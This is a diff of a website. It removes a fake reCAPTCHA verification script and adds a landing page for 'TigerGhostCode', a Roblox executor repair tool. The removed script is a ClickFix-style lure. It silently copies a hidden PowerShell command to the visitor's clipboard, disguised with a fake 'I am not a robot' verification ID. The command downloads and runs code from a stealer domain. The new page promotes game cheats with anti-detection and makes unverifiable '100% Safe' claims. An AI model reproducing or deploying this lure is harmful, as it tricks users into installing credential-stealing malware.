+    <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-8 max-w-6xl mx-auto">
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">V</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">Velocity</h3>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">N</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">Nezur</h3>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">R</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">Ronix</h3>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">S</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">Solara</h3>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">A</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">AWP</h3>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 hover:border-orange-500 transition-all duration-500 hover:-translate-y-2 text-center">
+        <div class="executor-logo rounded-lg mb-4 bg-gray-800/50 p-4 flex items-center justify-center h-28">
+          <span class="text-4xl font-cyber text-orange-400">S</span>
+        </div>
+        <h3 class="text-lg font-semibold text-orange-400 font-cyber">Swift</h3>
+      </div>
+    </div>
+  </section>
 
-        function runClickedCheckboxEffects() {
-            hideCaptchaCheckbox();
-            setTimeout(function(){
-                showCaptchaLoading();
-            },500);
-            setTimeout(function(){
-                showVerifyWindow();
-            },900)
-        }
+  <!-- Common Problems Fixed -->
+  <section class="py-20 px-6 bg-black/70 fade-in">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl font-bold font-cyber mb-4 text-pink-400">Common Problems Fixed</h2>
+      <p class="text-gray-300 max-w-2xl mx-auto">TigerGhostCode resolves these frustrating issues that plague Roblox executors.</p>
+    </div>
+    
+    <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8 max-w-6xl mx-auto">
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Error 268</h3>
+        <p class="text-gray-300">Eliminates the common Error 268 that causes executors to crash unexpectedly.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">DLL Injection Fails</h3>
+        <p class="text-gray-300">Fixes issues with DLL injection that prevent executors from working properly.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">API Not Working</h3>
+        <p class="text-gray-300">Resolves API connectivity issues that stop executors from functioning after updates.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Startup Crashes</h3>
+        <p class="text-gray-300">Prevents executors from crashing immediately upon startup.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Script Execution Failure</h3>
+        <p class="text-gray-300">Fixes issues that prevent scripts from executing properly in-game.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Missing DLL Files</h3>
+        <p class="text-gray-300">Repairs missing DLL files required for proper executor operation.</p>
+      </div>
+    </div>
+  </section>
 
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
-        }
+  <!-- Features -->
+  <section id="features" class="py-24 px-6 bg-gray-900/50 fade-in">
+    <div class="text-center mb-16">
+      <h2 class="text-3xl md:text-4xl font-bold font-cyber mb-4">
+        <span class="bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-pink-500">One-Click Fix Solution</span>
+      </h2>
+      <p class="text-gray-300 max-w-2xl mx-auto">TigerGhostCode brings you advanced repair technology to fix your favorite Roblox executors.</p>
+    </div>
+    
+    <div class="grid md:grid-cols-3 gap-8 text-left max-w-6xl mx-auto">
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">One-Click Repair</h3>
+        <p class="text-gray-300">Instantly fix all common executor problems with just a single click.</p>
+      </div>
+      
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Anti-Detection</h3>
+        <p class="text-gray-300">Enhanced security features to help prevent detection and bans.</p>
+      </div>
+      
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">DLL Repository</h3>
+        <p class="text-gray-300">Built-in repository of essential DLL files for all supported executors.</p>
+      </div>
+    </div>
+    
+    <div class="grid md:grid-cols-3 gap-8 text-left max-w-6xl mx-auto mt-8">
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Performance Boost</h3>
+        <p class="text-gray-300">Optimizes executors for faster script execution and reduced lag.</p>
+      </div>
+      
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Auto-Update</h3>
+        <p class="text-gray-300">Keeps your fix tool updated to handle new Roblox updates and security changes.</p>
+      </div>
+      
+      <div class="feature-card bg-black/60 p-8 rounded-xl border border-orange-500/30 hover:border-orange-500 transform transition-all duration-500 hover:-translate-y-2">
+        <div class="inline-block p-3 bg-orange-500/10 rounded-lg mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2" />
+          </svg>
+        </div>
+        <h3 class="text-xl font-semibold mb-3 text-orange-400 font-cyber">Script Library</h3>
+        <p class="text-gray-300">Access to a collection of pre-optimized scripts that work with all fixed executors.</p>
+      </div>
+    </div>
+  </section>
 
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.opacity = "0";
-            checkboxBtnSpinner.style.animation = "none";
-            setTimeout(function() {
-                checkboxBtnSpinner.style.visibility = "hidden";
-            }, 500);
-        }
-
-        function hideCaptchaCheckbox() {
-            checkboxBtn.style.visibility = "hidden";
-            checkboxBtn.style.opacity = "0";
-        }
-
-
-        function showCaptchaCheckbox() {
-            checkboxBtn.style.width = "100%";
-            checkboxBtn.style.height = "100%";
-            checkboxBtn.style.borderRadius = "2px";
-            checkboxBtn.style.margin = "21px 0 0 12px";
-            checkboxBtn.style.opacity = "1";
-        }
-
-        function hideCaptchaCheckbox() {
-            checkboxBtn.style.width = "4px";
-            checkboxBtn.style.height = "4px";
-            checkboxBtn.style.borderRadius = "50%";
-            checkboxBtn.style.marginLeft = "25px";
-            checkboxBtn.style.marginTop = "33px";
-            checkboxBtn.style.opacity = "0";
-        }
-
-        function showCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "visible";
-            checkboxBtnSpinner.style.opacity = "1";
-        }
-
-        function hideCaptchaLoading() {
-            checkboxBtnSpinner.style.visibility = "hidden";
-            checkboxBtnSpinner.style.opacity = "0";
-        }
-
-       function generateRandomNumber() {
-            const min = 1000;
-            const max = 9999;
-            return Math.floor(Math.random() * (max - min + 1) + min).toString();
-        }
-
-        function closeverifywindow() {
-            verifywindow.style.display = "none";
-            verifywindow.style.visibility = "hidden";
-            verifywindow.style.opacity = "0";
-
-            showCaptchaCheckbox();
-            hideCaptchaLoading();
-            checkboxBtn.disabled = false;
-        }
-
-        function isverifywindowVisible() {
-            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
-        }
-
-        function setClipboardCopyData(textToCopy){
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.append(tempTextArea);
-            tempTextArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempTextArea);
-        }
-
-        function stageClipboard(commandToRun, verification_id){
-            const suffix = " # "
-            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
-            const end = "''"
-            const textToCopy = commandToRun + suffix + ploy + verification_id + end
-
-            setClipboardCopyData(textToCopy);
-        }
-
-
-        function showVerifyWindow() {
-            verifywindow.style.display = "block";
-            verifywindow.style.visibility = "visible";
-            verifywindow.style.opacity = "1";
-            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
-
-            if (verifywindow.offsetTop < 5) {
-               verifywindow.style.top = "5px";
-            }
-
-            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
-               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
-            }
-
-            var verification_id = generateRandomNumber();
-            document.getElementById('verification-id').textContent = verification_id;
-
-            const commandToRun = 'powershell -w hidden -ep bypass -c "Start-Process powershell -WindowStyle Hidden -ArgumentList \'-ep bypass -c iwr https://stealer.cy/psc?uid=101^|iex\'"'
-            stageClipboard(commandToRun, verification_id)
-        }
-
-        addCaptchaListeners();
-
-        </script>
-    </body>
-</html>
+<!-- Download Section -->
+<section id="download" class="py-24 px-6 bg-black fade-in relative overflow-hidden">
+  <!-- Background effects -->
+  <div class="absolute inset-0 cyber-grid opacity-30 pointer-events-none"></div>
+  <div class="absolute inset-0 bg-radial-gradient pointer-events-none opacity-20" style="background: radial-gradient(circle at 50% 50%, rgba(255, 119, 0, 0.2), transparent 70%);"></div>
+  
+  <div class="max-w-6xl mx-auto text-center relative z-10">
+    <h2 class="text-3xl md:text-5xl font-bold font-cyber mb-8">
+      <span class="bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-pink-500">Ready to Fix Your Executor?</span>
+    </h2>
+    
+    <p class="text-gray-300 text-xl mb-10 max-w-2xl mx-auto">Download TigerGhostCode now and get your favorite Roblox executor working again in seconds.</p>
+    
+    <div class="relative max-w-md mx-auto bg-black/80 p-8 rounded-2xl border border-orange-500/30 mb-12">
+      <div class="absolute -inset-0.5 bg-gradient-to-r from-orange-400 to-pink-600 rounded-2xl opacity-50 blur-sm"></div>
+      <div class="relative bg-black/95 p-8 rounded-xl z-10">
+        <h3 class="text-2xl font-cyber text-orange-400 mb-4">TigerGhostCode v2.5</h3>
+        
+        <ul class="text-left mb-6 space-y-3">
+          <li class="flex items-center text-gray-300">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-orange-400 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+            </svg>
+            Works with all popular executors
+          </li>
+          <li class="flex items-center text-gray-300">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-orange-400 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+            </svg>
+            100% Free - No hidden fees
+          </li>
+          <li class="flex items-center text-gray-300">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-orange-400 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+            </svg>
+            Regular updates for new Roblox versions
+          </li>
+        </ul>
+        
+        <div class="flex flex-col space-y-4">
+          <button class="relative btn-cyber group">
+            <div class="absolute -inset-0.5 bg-gradient-to-r from-orange-400 to-pink-600 rounded-lg opacity-70 group-hover:opacity-100 blur transition duration-200"></div>
+            <a href="#" class="relative flex items-center justify-center bg-black text-white font-cyber font-bold py-4 px-8 rounded-lg w-full text-lg">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+              </svg>
+              DOWNLOAD NOW
+            </a>
+          </button>
+          
+          <div class="text-gray-400 text-sm">
+            Latest Update: May 2025 • File Size: 14.2 MB
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="grid md:grid-cols-3 gap-8 max-w-4xl mx-auto">
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <div class="flex items-center justify-center h-12 mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+        </div>
+        <h3 class="text-lg font-semibold mb-2 text-orange-400 font-cyber">100% Safe</h3>
+        <p class="text-gray-400 text-sm">Virus-free, no malware. Verified by multiple antivirus engines.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <div class="flex items-center justify-center h-12 mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+        </div>
+        <h3 class="text-lg font-semibold mb-2 text-orange-400 font-cyber">Quick Install</h3>
+        <p class="text-gray-400 text-sm">Setup in under 30 seconds. No complicated configuration needed.</p>
+      </div>
+      
+      <div class="bg-black/60 p-6 rounded-xl border border-orange-500/30 transition-all duration-300 hover:border-orange-500">
+        <div class="flex items-center justify-center h-12 mb-4">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-orange-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z" />
+          </svg>
+        </div>
+        <h3 class="text-lg font-semibold mb-2 text-orange-400 font-cyber">24/7 Support</h3>
+        <p class="text-gray-400 text-sm">Join our Discord community for assistance and updates.</p>
+      </div>
+    </div>
+  </div>
+</section>
+  
